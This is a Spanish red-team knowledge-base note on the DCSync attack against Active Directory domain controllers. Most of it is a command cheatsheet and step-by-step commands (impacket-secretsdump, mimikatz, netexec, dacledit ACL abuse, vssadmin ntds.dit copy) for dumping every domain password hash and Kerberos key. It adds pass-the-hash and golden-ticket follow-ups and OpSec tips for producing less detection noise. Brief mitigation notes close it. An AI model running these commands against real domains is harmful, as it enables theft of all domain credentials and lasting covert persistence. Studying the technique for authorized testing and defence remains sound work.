---
aliases:
  - DC Sync
  - DCSync Attack
  - Directory Replication Attack
tags:
  - type/atomic
  - technique/credential-access
  - technique/persistence
  - env/windows
  - asset/active-directory
  - cred/ntlm
  - cred/kerberos
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
tertiary categories:
  - "[[Active Directory]]"
type: Atomic
linked:
  - "[[Active Directory Exploitation]]"
  - "[[Golden Ticket]]"
  - "[[LSASS Dumping]]"
---
# DCSync

***

## Cheatsheet
^dcsync

| Target | Command |
| --- | --- |
| **Todos hashes (Linux)** | `impacket-secretsdump dom.local/user:pass@DC -just-dc-ntlm` |
| **Todos + Kerberos keys** | `impacket-secretsdump dom.local/user:pass@DC -just-dc` |
| **User específico** | `impacket-secretsdump dom.local/user:pass@DC -just-dc-user 'dom\administrator'` |
| **Con NT hash** | `impacket-secretsdump -hashes :NTHASH dom.local/user@DC -just-dc-ntlm` |
| **Con ticket** | `export KRB5CCNAME=tkt.ccache; impacket-secretsdump -k -no-pass dom.local/user@DC.dom.local -just-dc-ntlm` |
| **mimikatz (Windows)** | `mimikatz "lsadump::dcsync /domain:dom.local /user:krbtgt"` |
| **nxc** | `nxc smb DC -u user -p pass --ntds` |

***

## Concepto

DCSync simula el comportamiento de un Domain Controller solicitando replicación al DC real via protocolo **MS-DRSR** (Directory Replication Service Remote). El DC responde con los secretos del directorio (hashes NTLM, claves Kerberos, credenciales DPAPI, etc.).

**No requiere ejecutar código en el DC** — es una operación LDAP/RPC remota.

## Requisitos (permisos)

Usuario o computer account con **dos** extended rights sobre el naming context del dominio:

| Permiso | CN | Necesario para |
| --- | --- | --- |
| `DS-Replication-Get-Changes` | `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` | Replicación básica |
| `DS-Replication-Get-Changes-All` | `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` | Incluye atributos sensibles (hashes) |

Opcional para filtered sets:
- `DS-Replication-Get-Changes-In-Filtered-Set` — RODC scenarios.

Defaults con permisos DCSync:
- **Domain Admins**, **Enterprise Admins**, **Administrators**.
- **Domain Controllers** (incluye computer accounts de DCs).
- Cuentas custom delegadas para Azure AD Connect / Exchange (pre-split permissions).

## 1. Detectar si tenés permisos

### Certipy / BloodHound
```cypher
MATCH p=(u {owned:true})-[:DCSync|GetChanges|GetChangesAll]->(d:Domain)
RETURN p
```

### PowerView
```powershell
Get-ObjectAcl -DistinguishedName "DC=dom,DC=local" -ResolveGUIDs |
  Where-Object {$_.ObjectAceType -match "Replicat"} |
  Select-Object IdentityReference, ObjectAceType
```

### Via impacket
```bash
# Si tiene permisos, corre sin error:
impacket-secretsdump dom.local/user:pass@DC -just-dc-user krbtgt
```

## 2. Linux (impacket-secretsdump)

### Full dump (NT hashes only)
```bash
impacket-secretsdump dom.local/user:pass@DC.dom.local -just-dc-ntlm
```

### Full dump con Kerberos keys (AES)
```bash
impacket-secretsdump dom.local/user:pass@DC.dom.local -just-dc
```

### Target específico
```bash
impacket-secretsdump dom.local/user:pass@DC.dom.local -just-dc-user 'dom\krbtgt'
impacket-secretsdump dom.local/user:pass@DC.dom.local -just-dc-user 'dom\administrator'
```

### Pass-the-hash
```bash
impacket-secretsdump -hashes :abc123NTHASH dom.local/user@DC -just-dc-ntlm
```

### Con ticket Kerberos
```bash
export KRB5CCNAME=/tmp/user.ccache
impacket-secretsdump -k -no-pass dom.local/user@DC.dom.local -just-dc-ntlm
```

### Output
```
dom.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:5f4dcc3b5aa765d61d8327deb882cf99:::
dom.local\krbtgt:502:aad3b435b51404eeaad3b435b51404ee:abc123def456...:::
```

Formato: `user:RID:LM:NTHASH:::`.

## 3. mimikatz (Windows on-host)

```powershell
mimikatz.exe
> privilege::debug
> lsadump::dcsync /domain:dom.local /user:krbtgt
> lsadump::dcsync /domain:dom.local /user:Administrator
> lsadump::dcsync /domain:dom.local /all /csv
```

Sin DA requerido si el user tiene permisos de replicación.

## 4. netexec / crackmapexec

```bash
nxc smb DC -u user -p pass --ntds
# Usa DRSUAPI internamente (DCSync) si permisos lo permiten, fallback a VSS copy

# Target user
nxc smb DC -u user -p pass --ntds --user krbtgt
```

## 5. Delegated DCSync (sin DA, via ACL abuse)

Con `GenericAll` sobre el dominio root:

```powershell
# Windows
Add-DomainObjectAcl -TargetIdentity "DC=dom,DC=local" -PrincipalIdentity attacker -Rights DCSync
```

```bash
# Linux
dacledit.py -action write -rights DCSync -principal attacker dom.local/da:password@DC
```

Luego DCSync normal.

## 6. Chains post-DCSync

### Golden Ticket
Con krbtgt hash → [[Golden Ticket]] forjado → persistence indefinida.

### Silver Ticket
Con hash de service account → TGS forjado para servicio específico.

### Pass-the-hash
Con hash de administrator → PtH a cualquier host.

### Kerberos keys → Kerberos pre-auth
Con AES keys → evitar dejar rastro de PtH.

## 7. OpSec

### Eventos generados (server-side en DC)
- **4662** "Object access" con ACCESS_MASK `0x00000100` + property GUID de replication rights.
- **4624** logon del user que inicia la sync.
- Honeypot canary: cuenta con SPN o flag especial monitoreada (detección clara).

### Tips
- Replicar solo `krbtgt` + `administrator` genera menos ruido que dump completo.
- Desde DC mismo: `ntdsutil` / `reg save` + volumen shadow copy — no genera 4662 de replication.
- Desde DC con `vssadmin`:
  ```cmd
  vssadmin create shadow /for=C:
  copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\
  reg save HKLM\SYSTEM C:\Temp\SYSTEM
  impacket-secretsdump LOCAL -ntds ntds.dit -system SYSTEM
  ```

## 8. Cleanup

- Borrar cuentas delegadas agregadas.
- Borrar KeyCredentialLinks si se usaron.
- Remover ACLs agregadas:
  ```bash
  dacledit.py -action remove -rights DCSync -principal attacker dom.local/da:password@DC
  ```

## Mitigación (blue team)

- Tier 0 isolation estricto.
- Alerta sobre evento 4662 con property GUIDs de replication fuera de computer accounts de DCs.
- Rotación krbtgt password x2 cada 180 días.
- Protected Users group para DA.
- Red Forest / ESAE / Tier 0 admin hardening.
- Microsoft Defender for Identity detecta DCSync anómalo por comportamiento.

## Recursos

- [HackTricks - DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
- [ADSecurity - DCSync detection](https://adsecurity.org/?p=1729)
- [impacket secretsdump](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)

***
